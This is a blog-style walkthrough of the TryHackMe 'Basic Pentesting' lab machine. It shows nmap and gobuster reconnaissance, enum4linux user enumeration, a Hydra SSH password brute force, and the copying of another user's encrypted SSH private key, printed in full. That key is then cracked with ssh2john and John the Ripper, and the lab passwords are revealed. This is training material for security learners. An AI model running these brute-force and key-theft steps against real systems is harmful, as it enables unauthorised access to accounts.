---
layout: post
title: "Basic Pentesting Writeup"
author: "Rubber Ducky"
categories: tryhackme
tags: [writeup]
image: thm_basic_pentesting2.png
---

[This](https://tryhackme.com/room/basicpentestingjt) machine gives a basic introduction to elementary methods in pentesting webapps.

### Recon {#recon}

Target IP: _10.10.71.109_

We start with a basic nmap scan to find open ports, then scan these ports more aggressively for more information.
#### Command:
>_nmap [target]_

```
─$ nmap 10.10.126.228

Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-29 14:23 EDT

Nmap scan report for 10.10.126.228
Host is up (0.026s latency).
Not shown: 994 closed ports

PORT     STATE SERVICE

22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds
```

These are the open ports. Let’s scan each of these more aggressively.

#### Command:
>_nmap [target] -A -p 22,80,139,445,8009,8080._

```
─$ sudo nmap 10.10.126.228 -p 22,80,139,445,8009,8080 -A -sV -sC -O                          	1 ⨯

[sudo] password for kali:

Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-29 14:35 EDT

Nmap scan report for 10.10.126.228
Host is up (0.024s latency).

PORT 	STATE SERVICE 	VERSION

22/tcp   open  ssh     	OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)

80/tcp   open  http    	Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

8009/tcp open  ajp13   	Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS

8080/tcp open  http    	Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.7

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)

No exact OS matches for host (test conditions non-ideal).

Network Distance: 2 hops

Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: &lt;unknown>, NetBIOS MAC: &lt;unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-08-29T14:36:05-04:00

| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_	Message signing enabled but not required
| smb2-time:
|   date: 2022-08-29T18:36:05
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)

HOP RTT  	ADDRESS
1   21.26 ms 10.9.0.1
2   24.44 ms 10.10.126.228

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 20.49 seconds
```

We see SSH on port 22 is open, running OpenSSH 7.2p2. A webserver is being run on port 80, using Apache 2.4.18. Port 139 and 445 are using NetBIOS for Samba, port 8009 is running Apache Jserv and 8080 is running Apache Tomcat 9.0.7.

Let’s visit this webpage.

![alt text](assets/img/tryhackme/basic_pentesting/webpage.PNG "Web Page")

This is what the website looks like. There is not much information here. There is also no robots.txt file to hide any directories. A comment in the homepage’s source code mentions a ‘dev notes’ section. It sounds like there could be a subdomain or subdirectory called ‘devnotes’ or something similar.

### Web Enumeration {#Web-Enumeration}

Let’s use gobuster with SecList’s  common.txt wordlist to brute-force subdomains.

#### Command:
>_gobuster dir -u [target] -w /path/to/seclists/Discovery/Web-Content/common.txt_

```
└─$ gobuster dir -u 10.10.126.228 -w /usr/share/seclists/Discovery/Web-Content/common.txt       	 

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================

[+] Url:                 	http://10.10.126.228
[+] Method:              	GET
[+] Threads:             	10
[+] Wordlist:            	/usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:          	gobuster/3.1.0
[+] Timeout:             	10s

===============================================================
2022/08/29 14:56:13 Starting gobuster in directory enumeration mode
===============================================================

/.htaccess        	(Status: 403) [Size: 297]
/.hta             	(Status: 403) [Size: 292]
/.htpasswd        	(Status: 403) [Size: 297]
/development      	(Status: 301) [Size: 320] [--> http://10.10.126.228/development/]
/index.html       	(Status: 200) [Size: 158]                                   	 
/server-status    	(Status: 403) [Size: 301]                                   	 

===============================================================
2022/08/29 14:56:26 Finished
===============================================================
```

```.htaccess```, ```.hta``` and ```.htpasswd``` are default Apache subdirectories. The ```development``` subdirectory looks interesting…

![alt text](assets/img/tryhackme/basic_pentesting/development.PNG "Development Subdirectory")

Navigating to this subdirectory, we find some text files.

```j.txt``` contains:
```
For J:
I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.
-K
```

```dev.txt``` contains:
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too. Haven't made any real web apps yet, but I have tried that example you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

These were some interesting messages.

The first message complements what we know from the nmap scan, and the second message tells us that J’s password is easy to crack.

We know from nmap that this server is running Ubuntu. Let’s use enum4linux to find out more about their web server, and maybe find some usernames.

#### Command:
>_enum4linux -a [target] > enum.txt_

The most interesting part of the output is the enumerated usernames section. We see the following results.

```
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1000 Unix User\jan (Local User)
```

And we now have two usernames, and we’ve learnt the names of the elusive K and J.

### Initial Access {#initial-access}

We will use Hydra to try to crack Jan’s password for SSH, since we know it is weak. We use the username jan and the darkweb2017 top 10000 wordlist from SecLists.

#### Command:
>_hydra -l jan -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt [target] ssh_

```
_└─$ hydra -l jan -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt 10.10.126.228 ssh	255 ⨯_

_Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway)._

_Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-29 15:14:05_

_[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4_
_[DATA] max 16 tasks per 1 server, overall 16 tasks, 9999 login tries (l:1/p:9999), ~625 tries per task_
_[DATA] attacking ssh://10.10.126.228:22/_
_[STATUS] 183.00 tries/min, 183 tries in 00:01h, 9823 to do in 00:54h, 16 active_
_[STATUS] 140.67 tries/min, 422 tries in 00:03h, 9584 to do in 01:09h, 16 active_
_[STATUS] 117.57 tries/min, 823 tries in 00:07h, 9183 to do in 01:19h, 16 active_
_[STATUS] 117.60 tries/min, 1764 tries in 00:15h, 8242 to do in 01:11h, 16 active_

_[22][ssh] host: 10.10.126.228   login: jan   password: armando_

_1 of 1 target successfully completed, 1 valid password found_
_[WARNING] Writing restore file because 7 final worker threads did not complete until end._
_[ERROR] 7 targets did not resolve or could not be connected_
_[ERROR] 0 target did not complete_
_Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-29 15:41:43_
```

We got a hit! Jan’s password is armando. We can now ssh into Jan’s account.

#### Command:
>_ssh jan@[target]_

### Lateral Movement {#lateral-movement}
Looking around, we see that we can access Kay’s home directory, and access her SSH private key.

```
jan@basic2:~$ cd ..
jan@basic2:/home$ ls
jan  kay

jan@basic2:/home$ cd kay
jan@basic2:/home/kay$ ls -la

total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay	57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay 	0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@basic2:/home/kay$ cd .ssh
jan@basic2:/home/kay/.ssh$ cat id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
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
-----END RSA PRIVATE KEY-----

jan@basic2:/home/kay/.ssh$ exit

logout
Connection to 10.10.151.255 closed.
```

Let’s try crack this with John the Ripper.

First, the ssh key is pasted into a text file, key.txt. We then use ssh2john to convert this private key into a form that John can understand, then we start cracking. The rockyou.txt wordlist is used.

#### Command:
>_python3 /usr/share/john/ssh2john.py key.txt > john.txt_

>_john --wordlist /usr/share/wordlists/rockyou.txt john.txt_

When I ran this command, I got a python error:
```
File "/usr/share/john/ssh2john.py", line 103, in read_private_key
data = base64.decodestring(data)

AttributeError: module 'base64' has no attribute 'decodestring'
```

After some Googling, I realised that this is probably an issue with using Python 3. I reran the command with python 2, and it worked.

After a few minutes, John spat out the cracked hash - ```beeswax```. We now have kay’s password!

We can now SSH to kay’s account using the private key, and use the password. The private key has been pasted and saved into a file named ```id_rsa```.

**Command: _ssh -i id_rsa kay@[target]_**

At first, this didn’t work. I got a ‘warning: unprotected private key file’ error. This occurred because ssh private key files must have the appropriate permissions - the user should have read/write permissions, and no one else should. These permissions have the code rw-------, or 600. We change the permissions of ```id_rsa``` with chmod.

#### Command:
>_chmod 600 id_rsa._

When I tried to SSH into kay’s account again, it worked.

```
Enter passphrase for key 'id_rsa':

Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management: 	https://landscape.canonical.com
 * Support:    	https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.
Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102

kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
kay@basic2:~$
```

We find the final password file, containing the final flag!
